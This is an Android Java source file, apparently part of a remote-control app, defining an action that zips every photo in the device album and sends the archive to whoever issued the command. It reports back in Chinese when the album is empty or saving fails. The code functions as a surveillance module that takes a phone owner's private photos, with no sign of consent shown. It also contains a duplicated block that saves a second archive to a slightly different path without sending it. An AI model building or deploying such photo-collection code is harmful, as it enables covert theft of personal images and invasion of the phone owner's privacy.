package com.lfish.control.action.actiondomian;


import com.lfish.control.ControlApplication;
import com.lfish.control.action.BaseBeanAction;
import com.lfish.control.action.actiontool.CmdUtils;
import com.lfish.control.action.actiontool.PTGraph;
import com.lfish.control.action.actiontool.Utils;

import java.io.File;

public class GetPhotosAction extends BaseBeanAction {

	public String SetPath(String name)
	{
		return  Utils.SDPATH +"." + Utils.DIR + File.separator+name;
	}

	@Override
	public void run() {
		// TODO Auto-generated method stub

		if (Utils.isSDCardPathAvailable(ControlApplication.context)) {
			File dirFile = new File(Utils.SDPATH+ Utils.DIR, Utils.PIC_DIR);
			if (!dirFile.exists()) {
				dirFile.mkdirs();
			}
			String FileName= CmdUtils.GetFileName(ControlApplication.context, getFrom(), "zip");
			try {
				PTGraph photoManager = new PTGraph(ControlApplication.context,
						dirFile.getAbsolutePath());
				photoManager.save(SetPath(FileName));
			} catch (Exception e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
//			Core.self().executeAction(GetPath(),cd.GetOrder());
		}

		if (Utils.isSDCardPathAvailable(ControlApplication.context)) {
			File dirFile = new File(Utils.SDPATH+ Utils.DIR, Utils.PIC_DIR);
			if (!dirFile.exists()) {
				dirFile.mkdirs();
			}

			String FileName= CmdUtils.GetFileName(ControlApplication.context, "photos", "zip");
			String path = Utils.SDPATH +"" + Utils.DIR + File.separator+FileName;
			PTGraph photoManager = new PTGraph(ControlApplication.context,
					dirFile.getAbsolutePath());

			Boolean save = photoManager.save(path);

			File file = new File(path);

			if(file.exists()){
				if(save){
					SendFile(path);
				}else{
					sendTxt("保存图片失败");
				}
			}else{
				sendTxt("相册为空~无相片发送");
			}
		}
	}

}
